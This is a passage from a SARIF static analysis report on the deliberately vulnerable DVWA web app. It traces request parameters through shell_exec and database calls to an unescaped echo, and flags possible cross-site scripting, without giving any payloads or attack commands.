                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:34 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:34 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:34 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Read $_REQUEST['ip']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - trim(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:5 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:21 - Assignment to $target"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 21
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - shell_exec(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:30 - Assignment to $cmd"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 30
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:34 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4470",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "44E5A2FE685EAAF8FE335351C62AB6F3"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:47 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 47
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:47 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 47
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:47 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 47
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:47 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 47
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Read $_REQUEST['id']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:5 - Assignment to $id"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 5
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:47 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 47
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "low.php:3 - low.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/source/low.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - low.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4520",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "643930933CB339199CBD242CD193DB95"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "low.php:13 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
